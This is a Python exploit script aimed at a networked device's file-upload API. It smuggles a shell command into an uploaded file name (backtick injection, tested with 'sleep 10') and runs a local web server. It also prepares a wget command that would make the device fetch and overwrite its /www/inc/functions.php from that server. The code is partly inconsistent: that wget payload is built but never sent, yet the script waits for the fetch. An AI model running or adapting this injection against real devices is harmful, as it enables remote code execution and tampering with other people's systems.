import requests
import time
import threading
import http.server
import socketserver
import os
import sys

TARGET_IP = "192.168.1.173"
UPLOAD_URL = f"http://{TARGET_IP}/api/index.php?url=update-file-upload"
CHECK_URL = f"http://{TARGET_IP}/api/tlc/1"
LOCAL_IP = "192.168.1.11"
PORT = 8000
PAYLOAD_DIR = "payload"

class QuietHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

requested_file = False
requested_index = False

class RequestHandler(QuietHandler):
    def do_GET(self):
        global requested_file, requested_index
        print(f"[+] Server: Request for {self.path} from {self.client_address[0]}")
        if "functions.php" in self.path:
            requested_file = True
        elif "index.html" in self.path or self.path == "/":
            requested_index = True
        super().do_GET()

def start_server():
    if not os.path.exists(PAYLOAD_DIR):
        os.makedirs(PAYLOAD_DIR)
    os.chdir(PAYLOAD_DIR)
    with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
        print(f"[+] Server started at http://{LOCAL_IP}:{PORT}")
        httpd.serve_forever()

import base64

def exploit():
    # Payload to execute
    raw_cmd = f"wget -O /www/inc/functions.php http://{LOCAL_IP}:{PORT}/functions.php"
    b64_cmd = base64.b64encode(raw_cmd.encode()).decode()
    
    # Payload to test execution with sleep
    # If request takes > 10s, RCE is confirmed.
    cmd = "sleep 10"
    
    # Filename injection: "x`cmd`"
    filename = f"x`{cmd}`"
    
    print(f"[+] Malicious filename: {filename}")
    
    files = {
        'file': (filename, b'dummy content', 'application/octet-stream')
    }
    
    print(f"[+] Uploading to {UPLOAD_URL}")
    try:
        r = requests.post(UPLOAD_URL, files=files, timeout=20)
        print(f"[+] Upload status: {r.status_code}")
        # print(f"[+] Upload response: {r.text[:200]}")
    except Exception as e:
        print(f"[-] Upload failed: {e}")
        return

    print("[+] Waiting for device to fetch payload...")
    for i in range(10):
        if requested_file:
            print("[+] SUCCESS: Device requested functions.php!")
            break
        time.sleep(1)
    
    if not requested_file:
        print("[-] Warning: Device did not request functions.php.")
    
    print("[+] Verifying fix via API...")
    try:
        response = requests.get(CHECK_URL, timeout=10)
        if response.status_code == 200:
            try:
                data = response.json()
                if isinstance(data, list) and len(data) > 0:
                    data = data[0]
                
                ip = data.get('ip')
                print(f"[+] API Response IP: {ip}")
                if ip and ip != "1.1.1.1":
                    print("[+] VERIFICATION SUCCESS: IP is correctly reported!")
                else:
                    print("[-] VERIFICATION FAILED: IP is still 1.1.1.1.")
            except:
                print(f"[-] Failed to parse JSON: {response.text[:100]}")
        else:
            print(f"[-] API check failed: Status {response.status_code}")
    except Exception as e:
        print(f"[-] API check failed: {e}")

if __name__ == "__main__":
    # Start server in background thread
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    
    # Give server a moment to start
    time.sleep(2)
    
    exploit()
